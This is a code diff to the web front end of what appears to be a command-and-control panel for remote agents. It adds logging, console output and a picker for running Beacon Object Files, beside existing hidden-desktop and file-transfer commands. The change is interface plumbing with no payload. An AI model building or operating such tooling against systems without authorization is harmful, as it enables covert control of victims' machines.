@@ -216,13 +216,24 @@
                 refreshAgents();
                 break;
             case 'agent_result':
-                var isInternal = data.command && (String(data.command).indexOf('__hd:') === 0 || String(data.command).indexOf('__fs:') === 0 || String(data.command).indexOf('__px:') === 0);
-                if (!isInternal) addEventLog('agent_result', data.agent_id + ': ' + data.command);
+                var cmdStr2 = String(data.command || '');
+                var isInternal = cmdStr2.indexOf('__hd:') === 0 || cmdStr2.indexOf('__fs:') === 0 || cmdStr2.indexOf('__px:') === 0;
+                var isBof = cmdStr2.indexOf('__bof:') === 0;
+                if (isBof) {
+                    var bofEntry = cmdStr2.split(':')[1] || 'go';
+                    addEventLog('bof', data.agent_id + ': BOF(' + bofEntry + ') complete');
+                } else if (!isInternal) {
+                    addEventLog('agent_result', data.agent_id + ': ' + data.command);
+                }
                 if (consoleTabs[data.agent_id]) {
                     if (isInternal) {
                         if (data.output && String(data.output).indexOf('HDIMG:') === 0) showDesktopFrame(data.agent_id, data.output);
                     } else if (data.output && String(data.output).indexOf('HDIMG') !== 0) {
-                        appendConsole(data.agent_id, data.output, 'output');
+                        if (isBof) {
+                            appendConsole(data.agent_id, '[BOF] ' + data.output, 'output');
+                        } else {
+                            appendConsole(data.agent_id, data.output, 'output');
+                        }
                     }
                 }
                 for (var i = 0; i < agents.length; i++) {
@@ -236,8 +247,12 @@
             case 'command_sent':
             case 'command_queued':
                 var cmdStr = String(data.command || '');
-                if (cmdStr.indexOf('__hd:') !== 0 && cmdStr.indexOf('__fs:') !== 0 && cmdStr.indexOf('__px:') !== 0 && cmdStr.indexOf('__set_interval:') !== 0)
+                if (cmdStr.indexOf('__bof:') === 0) {
+                    var bEntry = cmdStr.split(':')[1] || 'go';
+                    addEventLog(data.event, '[' + (data.operator || 'op') + '] ' + data.agent_id + ': BOF(' + bEntry + ')');
+                } else if (cmdStr.indexOf('__hd:') !== 0 && cmdStr.indexOf('__fs:') !== 0 && cmdStr.indexOf('__px:') !== 0 && cmdStr.indexOf('__set_interval:') !== 0) {
                     addEventLog(data.event, '[' + (data.operator || 'op') + '] ' + data.agent_id + ': ' + data.command);
+                }
                 break;
             case 'agent_checkin':
                 addEventLog('agent_checkin', data.agent_id + ' checkin ' + (data.transport || ''));
@@ -670,6 +685,7 @@
         '',
         'Same as the terminal:',
         '  desktop <action>   Hidden desktop (start, frame, click x y, type, key)',
+        '  bof                Run a Beacon Object File (opens picker)',
         '  ls <path>          List a directory',
         '  get <path>         Download a file',
         '  put <remote>       Upload a local file (opens a picker)',
@@ -694,6 +710,10 @@
         if (command === 'clear') {
             var output = document.getElementById('console-output-' + agentId);
             if (output) output.innerHTML = '';
+            return;
+        }
+        if (command === 'bof') {
+            openBofModal(agentId);
             return;
         }
         if (command.indexOf('desktop ') === 0) {
@@ -1267,14 +1287,18 @@
         statusEl.textContent = 'Sending BOF to agent...';
         statusEl.style.color = 'var(--amber)';
         statusEl.classList.remove('hidden');
+        openConsole(bofAgentId);
+        appendConsole(bofAgentId, '[BOF] Executing: ' + entry + (args ? ' (args: ' + args + ')' : ''), 'command');
         try {
             var result = await api('POST', '/agents/' + bofAgentId + '/bof', { bof_data: bofFileData, args: args, entry: entry });
-            statusEl.textContent = result.output || result.message || 'BOF queued';
+            var out = result.output || result.message || 'BOF queued';
+            statusEl.textContent = out;
             statusEl.style.color = 'var(--green)';
-            addEventLog('bof', bofAgentId + ': ' + entry + ' → ' + (result.output || 'queued'));
+            document.getElementById('bof-modal').classList.add('hidden');
         } catch(e) {
             statusEl.textContent = 'Error: ' + e.message;
             statusEl.style.color = 'var(--red)';
+            appendConsole(bofAgentId, '[BOF] Error: ' + e.message, 'error');
         }
     });
 
